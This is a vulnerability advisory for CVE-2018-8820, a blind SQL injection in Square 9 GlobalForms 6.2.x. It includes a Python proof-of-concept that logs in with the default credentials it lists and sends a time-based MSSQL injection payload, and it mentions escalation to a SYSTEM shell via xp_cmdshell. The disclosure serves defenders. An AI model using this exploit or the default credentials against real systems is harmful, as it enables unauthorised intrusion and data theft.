
## Product Description

GlobalFormsA(r) is Square 9as powerful web forms product.  GlobalForms can
live separate of GlobalSearch and runs on a separate Web Engine.

## Vulnerability Type

Blind SQL injection

## Vulnerability Description

Square 9 GlobalForms versions 6.2.x (and possibly others) are vulnerable to
blind SQL injection in the match parameter wihtin the
"/frevvo/web/tn/d/users?match=" path. This is a remotely accessible,
authenticated function within default Square 9 GlobalForms instances.

## Exploit

A proof of concept is available here:
https://github.com/hateshape/frevvomapexec

frevvomapexec.py:

#!/usr/bin/python
import sys
import argparse
import datetime
import requests
from argparse import RawTextHelpFormatter
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def sqli(target, port, username, password, seconds):
    sqlpayload = "&#039;)waitfor%20delay&#039;0%3a0%3a" + str(seconds) + "&#039;--"
    s = requests.session()
    login_data = {&#039;username&#039;: &#039;admin@d&#039;, &#039;password&#039;: &#039;admin&#039;, &#039;lAction&#039;:&#039;Login&#039;}
    m = s.post(&#039;https://&#039; + target + &#039;:&#039; + port + &#039;/frevvo/web/login&#039;, data=login_data, verify=False
)

    print "Delay #1: " + str(datetime.datetime.utcnow())
    r = s.get((&#039;https://&#039; + target + &#039;:&#039; + port + "/frevvo/web/tn/d/users?match=t" + sqlpayload), verify=False, cookies=s.cookies)

    print "Delay #2: " +  str(datetime.datetime.utcnow())

if __name__ == &#039;__main__&#039;:
    parser = argparse.ArgumentParser(description="""
            
        Proof of Concept script for vulnerability validation.
         - Type of issue: Authenticated SQL injection
         - Product: Square 9 GlobalForms 6.2 
         - Version: v6.2.1.27377""",formatter_class=RawTextHelpFormatter)

    Required = parser.add_argument_group(&#039;Required&#039;)
    #Required
    Required.add_argument(&#039;-t&#039;, &#039;--target&#039;, help=&#039;Target URL or IP Address&#039;, required=True)
    Required.add_argument(&#039;-s&#039;,&#039;--seconds&#039;,  help=&#039;Number of seconds to pause Frevvo&#039;, required=True)
    Required.add_argument(&#039;-o&#039;,&#039;--port&#039;,  help=&#039;Frevvo Web Server Port&#039;, required=True)

    #Optional
    parser.add_argument(&#039;-u&#039;, &#039;--username&#039;, help=&#039;Login Username&#039;, default=&#039;admin&#039;, action="store_true", required=False)
    parser.add_argument(&#039;-p&#039;, &#039;--password&#039;, help=&#039;Login Password&#039;, default=&#039;admin@d&#039;, action="store_true", required=False)
    
    args = parser.parse_args()

    sqli(args.target,args.port,args.username,args.password,args.seconds)

    if len(sys.argv) == 1:
parser.print_help()



## Versions

Square 9 GlobalForms <= 6.2.x

## Attack Type

Authenticated, Remote

# Default Credentials
Username: admin
Password: admin@d

## Impact

The SQL injection vulnerability can be used to exfiltrate sensitive
information from the MSSQL DBMS used with GlobalForms. In every case that
was tested the DBMS was running with SYSTEM privileges and was successfully
used in conjunction with xp_cmdshell to establish an interactive shell.

## Credit

This vulnerability was discovered by Darrell Damstedt <hateshape () gmail
com>.

## References

CVE: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8820

